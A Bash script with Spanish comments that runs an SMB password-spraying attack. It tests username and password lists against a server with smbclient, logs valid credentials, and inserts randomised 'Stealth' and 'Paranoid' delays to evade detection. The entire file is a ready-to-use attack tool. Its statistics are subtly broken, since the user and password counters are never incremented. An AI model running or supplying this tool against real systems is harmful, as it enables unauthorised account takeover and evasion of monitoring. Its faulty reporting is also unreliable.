#!/bin/bash

# Autor: Federico Galarza
# Version: 1


# Colores
B="\e[94m"           # Azul
C="\e[1m\e[96m"      # Cyan
G="\e[1m\e[38;5;82m" # Verde
M="\e[95m"           # Magenta
R="\e[1m\e[31m"      # Rojo
Y="\e[1m\e[38;5;226m" # Amarillo
NF="\e[0m"           # Normal format

# Variables globales
LOG_FILE=""
SLEEP_SCALE=2 # Valor por defecto
TOTAL_PASSWORDS=0
TOTAL_USERS=0
VALID_CREDENTIALS=0

# Función de uso
function usage() {
    echo -e "${Y}[!]${NF} Uso: $0 -U [archivo_usuarios] -u [usuario] -P [archivo_contraseñas] -p [contraseña] -s [servidor] -d [dominio] -t [nivel_de_tiempo]"
    echo -e "${B}[i]${NF} Opciones:"
    echo "  -U    Archivo con la lista de usuarios (uno por línea)"
    echo "  -u    Un único usuario"
    echo "  -P    Archivo con la lista de contraseñas (una por línea)"
    echo "  -p    Una única contraseña"
    echo "  -s    Servidor SMB (por ejemplo, 192.168.1.10)"
    echo "  -d    Dominio (opcional)"
    echo "  -t    Nivel de tiempo (1: Paranoid, 2: Stealth (por defecto), 3: Fast, 4: More fast)"
    exit 1
}

# Manejar CTRL+C
trap ctrl_c INT
function ctrl_c() {
    local fecha_fin
    fecha_fin="$(date +"%d/%m/%Y a las %T")"
    echo -e "\n${Y}[!]${NF} Cancelando ejecución..."
    if [[ -n "$LOG_FILE" ]]; then
        {
            echo ""
            echo "[!] Ejecución cancelada: $fecha_fin"
            echo "###################################################"
        } >> "$LOG_FILE"
    fi
    tput cnorm
    exit 1
}

# Escribir en el log
function write_log() {
    local event=$1
    shift
    local message="$*"

    case "$event" in
        ini)
            echo "###################################################" >> "$LOG_FILE"
            echo "$(date '+%Y-%m-%d %T') - [i] Inicio del script" >> "$LOG_FILE"
            ;;
        fin)
            echo "$(date '+%Y-%m-%d %T') - [i] Fin del script" >> "$LOG_FILE"
            echo "###################################################" >> "$LOG_FILE"
            ;;
        message)
            echo "$(date '+%Y-%m-%d %T') - $message" >> "$LOG_FILE"
            ;;
        info)
            echo "$message" >> "$LOG_FILE"
            ;;
        *)
            echo "Error: Evento desconocido para write_log: $event" >&2
            ;;
    esac
}

# Generar tiempo de espera aleatorio
function random_sleep() {
    local min max
    case $SLEEP_SCALE in
        1) min=30; max=60 ;; # Paranoid
        2) min=11; max=22 ;; # Stealth
        3) min=1;  max=5  ;; # Fast
        4) min=0;  max=1  ;; # More fast
        *) min=11; max=22 ;; # Default (Stealth)
    esac
    local sleep_time=$(shuf -i "$min-$max" -n 1)
    echo -e "${B}[i]${NF} Esperando $sleep_time segundos antes de continuar..."
    sleep "$sleep_time"
}

# Función para rastrear estadísticas
function track_stats() {
    local type=$1
    case "$type" in
        user) ((TOTAL_USERS++)) ;;
        password) ((TOTAL_PASSWORDS++)) ;;
        valid) ((VALID_CREDENTIALS++)) ;;
        *) echo "Error: Tipo de estadística no reconocida: $type" >&2 ;;
    esac
}

# Validar parámetros
function validate_parameters() {
    if [[ -z "$SERVER" || (-z "$USERS_FILE" && -z "$SINGLE_USER") || 
          (-z "$PASSWORDS_FILE" && -z "$SINGLE_PASSWORD") ]]; then
        echo -e "${Y}[!]${NF} Error: Parámetros faltantes."
        usage
    fi

    if [[ -n "$USERS_FILE" && -n "$SINGLE_USER" ]]; then
        echo -e "${Y}[!]${NF} Error: No se puede usar -U y -u al mismo tiempo."
        usage
    fi
    if [[ -n "$PASSWORDS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
        echo -e "${Y}[!]${NF} Error: No se puede usar -P y -p al mismo tiempo."
        usage
    fi

    if [[ -n "$USERS_FILE" && ! -f "$USERS_FILE" ]]; then
        echo -e "${Y}[!]${NF} Error: Archivo de usuarios no encontrado: $USERS_FILE"
        exit 1
    fi
    if [[ -n "$PASSWORDS_FILE" && ! -f "$PASSWORDS_FILE" ]]; then
        echo -e "${Y}[!]${NF} Error: Archivo de contraseñas no encontrado: $PASSWORDS_FILE"
        exit 1
    fi
}

# Probar credenciales
function test_credentials() {
    local user=$1
    local password=$2
    local server=$3
    local domain=$4

    if smbclient -L "$server" -U "$user%$password" ${domain:+-W "$domain"} &>/dev/null; then
        echo -e "${G}[!]${NF} Credenciales válidas: $user:$password"
        write_log message "[!] Credenciales válidas: $user:$password"
        track_stats valid
        return 0
    else
        echo -e "${R}[x]${NF} Credenciales no válidas: $user:$password"
        return 1
    fi
}

# Procesa una lista de usuarios y una lista de contraseñas
function process_users_and_passwords() {
    local users_file=$1
    local passwords_file=$2
    local server=$3
    local domain=$4

    while IFS= read -r user; do
        [[ -z "$user" ]] && continue
        echo -e "${B}[i]${NF} Probando ..."
        echo -e "   - usuario:$Y $user $NF"
        while IFS= read -r password; do
            [[ -z "$password" ]] && continue
            echo -e "   - contraseña:$Y $password $NF\n"
#            echo -e "${C}[i]${NF}   Probando contraseña: $password..."
            test_credentials "$user" "$password" "$server" "$domain"
            random_sleep
        done < "$passwords_file"
    done < "$users_file"
}

# Procesa un usuario único y una lista de contraseñas
function process_single_user_and_passwords() {
    local user=$1
    local passwords_file=$2
    local server=$3
    local domain=$4

    echo -e "${B}[i]${NF} Probando ..."
    echo -e "   - usuario:$Y $user $NF"
    while IFS= read -r password; do
        [[ -z "$password" ]] && continue
        echo -e "   - contraseña:$Y $password $NF\n"
#        echo -e "${C}[i]${NF}   Probando contraseña: $password..."
        test_credentials "$user" "$password" "$server" "$domain"
        random_sleep
    done < "$passwords_file"
}

# Procesa una lista de usuarios y una contraseña única
function process_users_and_single_password() {
    local users_file=$1
    local password=$2
    local server=$3
    local domain=$4

    while IFS= read -r user; do
        [[ -z "$user" ]] && continue
        echo -e "${B}[i]${NF} Probando ..."
        echo -e "   - usuario:$Y $user $NF"
        echo -e "   - contraseña:$Y $password $NF\n"
        test_credentials "$user" "$password" "$server" "$domain"
        random_sleep
    done < "$users_file"
}

# Procesa un usuario único y una contraseña única
function process_single_user_and_password() {
    local user=$1
    local password=$2
    local server=$3
    local domain=$4

    echo -e "${B}[i]${NF} Probando ..."
    echo -e "   - usuario:$Y $user $NF"
    echo -e "   - contraseña:$Y $password $NF\n"
    test_credentials "$user" "$password" "$server" "$domain"
    random_sleep
}

# Procesar combinaciones
function process_combination() {
    if [[ -n "$USERS_FILE" && -n "$PASSWORDS_FILE" ]]; then
        write_log ini
        process_users_and_passwords "$USERS_FILE" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
        write_log fin
    elif [[ -n "$SINGLE_USER" && -n "$PASSWORDS_FILE" ]]; then
        write_log ini
        process_single_user_and_passwords "$SINGLE_USER" "$PASSWORDS_FILE" "$SERVER" "$DOMAIN"
        write_log fin
    elif [[ -n "$USERS_FILE" && -n "$SINGLE_PASSWORD" ]]; then
        write_log ini
        process_users_and_single_password "$USERS_FILE" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
        write_log fin
    elif [[ -n "$SINGLE_USER" && -n "$SINGLE_PASSWORD" ]]; then
        write_log ini
        process_single_user_and_password "$SINGLE_USER" "$SINGLE_PASSWORD" "$SERVER" "$DOMAIN"
        write_log fin
    else
        echo -e "${Y}[!]${NF} Error: Combinación de parámetros no válida."
        exit 1
    fi
}

# Reportar estadísticas
function report_stats() {
    echo -e "${B}[i]${NF} Resumen de ejecución:"
    echo -e "  - Usuarios probados: $TOTAL_USERS"
    echo -e "  - Contraseñas probadas: $TOTAL_PASSWORDS"
    echo -e "  - Combinaciones válidas encontradas: $VALID_CREDENTIALS"

    write_log message "Resumen:"
    write_log message "  - Usuarios probados: $TOTAL_USERS"
    write_log message "  - Contraseñas probadas: $TOTAL_PASSWORDS"
    write_log message "  - Combinaciones válidas encontradas: $VALID_CREDENTIALS"
}


# Main
# Configurar archivo de log
DOMAIN=${DOMAIN:-"default"}
LOG_FILE="spray_${DOMAIN}.log"

# Parseo de parámetros
while getopts "U:u:P:p:s:d:t:" opt; do
    case "$opt" in
        U) USERS_FILE="$OPTARG" ;;
        u) SINGLE_USER="$OPTARG" ;;
        P) PASSWORDS_FILE="$OPTARG" ;;
        p) SINGLE_PASSWORD="$OPTARG" ;;
        s) SERVER="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        t) SLEEP_SCALE="$OPTARG" ;;
        *) usage ;;
    esac
done

validate_parameters
process_combination
report_stats
